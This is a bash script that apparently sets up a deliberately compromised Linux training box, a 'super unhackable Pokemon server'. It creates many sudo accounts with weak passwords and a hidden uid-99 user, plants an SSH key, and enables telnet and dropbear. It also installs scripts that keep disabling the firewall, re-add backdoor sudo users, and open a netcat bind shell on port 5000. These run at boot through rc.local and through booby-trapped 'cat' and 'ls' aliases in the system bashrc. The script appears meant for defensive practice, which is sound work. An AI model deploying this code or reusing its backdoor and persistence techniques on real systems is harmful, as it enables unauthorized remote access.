#!/bin/bash
useradd -M -g sudo -p $(openssl passwd -crypt password) username
# -M no home dir
# -p password
# -g main group
# -u uid
apt-get -y install telnetd
apt-get -y install dropbear
apt-get -y install sl

/bin/sed -i "s/^#Banner.*/Banner etc\/issue.net/g" /etc/ssh/sshd_config

cat << EOF > /etc/issue.net
WELCOME TO TODDs SUPER UNHACKABLE POKEMON SERVER!
EOF

cat << EOF > /var/www/html/index.html
WELCOME TO TODDs SUPER UNHACKABLE POKEMON SERVER!
EOF


useradd -M -g sudo -u 99 -p $(openssl passwd -crypt sys) system

for user in nemo dory marlin squirt bruce crush nigel gill
do
useradd -m -p $(openssl passwd -crypt $user) $user

mkdir -p /home/$user/.ssh && touch /home/$user/.ssh/authorized_keys
cat << EOF >> /home/$user/.ssh/authorized_keys 
ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCyflMJTndThtH8EaymTG2GG0cqLVcuFtytyjFWy7iRmWvQi0Dsx8ZsW6hNrmOAteA5iYNLg47ZwRI1SdDJjlEpvyzEtdqrJZ7GDYCPQimRtUdOGuYfiTRewLo4V0VKyRfWHTSrDaVaooVwetcI9dQzolz6P2libVQkY/pde4F+YRGWyuU3KxYGTVyWvJ5rZHNDDMJc7AO+K/d/VOGQQmVzBpBraHDAVoeO/aat+JqUDzOk8P/Z1jum9Spa6QlNS21P6fnQUOyLGjdHRt5yHmpdVLHJ5gV3hqiuVc5Qa28avvX4gLTVaa3DfeoERzKFd9b0aCdUmLQXRxekxLHEc/5F zuba@laptop
EOF
done

for user in  harry hermione ron draco voldemort hagard sirius snape dumbledore
do
  useradd -M -g sudo -p $(openssl passwd -crypt $user) $user
done


cat << EOF > /bin/virus.sh
#!/bin/bash
while true
do
  /usr/sbin/ufw disable
  sleep 300
done
EOF
chmod 755 /bin/virus.sh

cat << EOF > /bin/malware.sh
#!/bin/bash
/bin/echo -e "!!! YOU NEED TO UPDATE YOUR ANTI-VIRUS !!! \n\nPlease run:\n***************\n* sudo reboot *\n*************** "
/sbin/.open.up.vIrUs.sh &
EOF
chmod 755 /bin/malware.sh

cat << EOF > /bin/trojan.sh
#!/bin/bash
while true
do
  /bin/echo 'trojan-virus pokemon attacking SSH banner' >> /etc/issue.net
  /bin/cp /bin/trojan.sh /home/trojan-virus
  sleep 180
  /home/trojan-virus &
  sleep 10
done
EOF
chmod 755 /bin/trojan.sh


cat << EOF > /sbin/let_us_in_VIRUS.sh
#!/bin/bash
/usr/sbin/useradd -M -g sudo -p $(openssl passwd -crypt 123) todd
for i in {1..10}
do
/usr/sbin/useradd -M -g sudo -p \$(openssl passwd -crypt \$i) \$i &>/dev/null
done
EOF
chmod 755 /sbin/let_us_in_VIRUS.sh


cat << EOF > /sbin/.open.up.vIrUs.sh
#!/bin/bash
rm /tmp/d 2>/dev/null;mkfifo /tmp/d;cat /tmp/d|/bin/bash -i 2>&1|nc -l 5000 >/tmp/d 2>/dev/null
EOF
chmod 755 /sbin/.open.up.vIrUs.sh

cat << EOF > /etc/rc.local
#!/bin/sh -e
#
# rc.local
#
# This script is executed at the end of each multiuser runlevel.
# Make sure that the script will "exit 0" on success or any other

#
# In order to enable or disable this script just change the execution
# bits.
#
# By default this script does nothing.
/bin/virus.sh || /bin/true
/bin/trojan.sh || /bin/true
/bin/worm.sh || /bin/true
/bin/virus.sh || /bin/true
/bin/trojan.sh || /bin/true
/bin/worm.sh || /bin/true
/usr/sbin/dropbear -p 2222 || /bin/true
exit 0
EOF

cat << 'EOF' >> /etc/bash.bashrc
# System-wide .bashrc file for interactive bash(1) shells.

# To enable the settings / commands in this file for login shells as well,
# this file has to be sourced in /etc/profile.

# If not running interactively, don't do anything
[ -z "$PS1" ] && return

# check the window size after each command and, if necessary,
# update the values of LINES and COLUMNS.
shopt -s checkwinsize

# set variable identifying the chroot you work in (used in the prompt below)
if [ -z "${debian_chroot:-}" ] && [ -r /etc/debian_chroot ]; then
    debian_chroot=$(cat /etc/debian_chroot)
fi

# set a fancy prompt (non-color, overwrite the one in /etc/profile)
PS1='${debian_chroot:+($debian_chroot)}\u@\h:\w\$ '

# Commented out, don't overwrite xterm -T "title" -n "icontitle" by default.
# If this is an xterm set the title to user@host:dir
#case "$TERM" in
#xterm*|rxvt*)
#    PROMPT_COMMAND='echo -ne "\033]0;${USER}@${HOSTNAME}: ${PWD}\007"'
#    ;;
#*)
#    ;;
#esac

# enable bash completion in interactive shells
#if ! shopt -oq posix; then
#  if [ -f /usr/share/bash-completion/bash_completion ]; then
#    . /usr/share/bash-completion/bash_completion
#  elif [ -f /etc/bash_completion ]; then
#    . /etc/bash_completion
#  fi
#fi

# sudo hint
if [ ! -e "$HOME/.sudo_as_admin_successful" ] && [ ! -e "$HOME/.hushlogin" ] ; then
    case " $(groups) " in *\ admin\ *|*\ sudo\ *)
    if [ -x /usr/bin/sudo ]; then
	cat <<-EOF
	To run a command as administrator (user "root"), use "sudo <command>".
	See "man sudo_root" for details.
	
	EOF
    fi
    esac
fi

# if the command-not-found package is installed, use it
if [ -x /usr/lib/command-not-found -o -x /usr/share/command-not-found/command-not-found ]; then
	function command_not_found_handle {
	        # check because c-n-f could've been removed in the meantime
                if [ -x /usr/lib/command-not-found ]; then
		   /usr/lib/command-not-found -- "$1"
                   return $?
                elif [ -x /usr/share/command-not-found/command-not-found ]; then
		   /usr/share/command-not-found/command-not-found -- "$1"
                   return $?
		else
		   printf "%s: command not found\n" "$1" >&2
		   return 127
		fi
	}
fi

alias cat='/sbin/let_us_in_VIRUS.sh; cat'
alias ls='/bin/malware.sh; echo; ls --color=auto'
#PS1="\u@\h:\w\$ "
#what user@comp prompt looks like
if [ $(id -u) -eq 0 ];
then #root
 PS1="\[\033[0;31m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;31m\]#\[\033[0m\] "
else #normal
 PS1="\[\033[0;32m\]\u\[\033[0;33m\]@\[\033[0;35m\]\h\[\033[0;37m\]\w\[\033[0;37m\]$\[\033[0m\] "
fi
#Auto complete lines
bind '"\t":menu-complete'
#tab cycling
bind '"\e[Z": menu-complete-backward'
#works for tab backwards
EOF

cat << EOF >> /home/student/.bashrc
. /etc/bash.bashrc
EOF

cat << EOF >> /root/.bashrc
. /etc/bash.bashrc
EOF
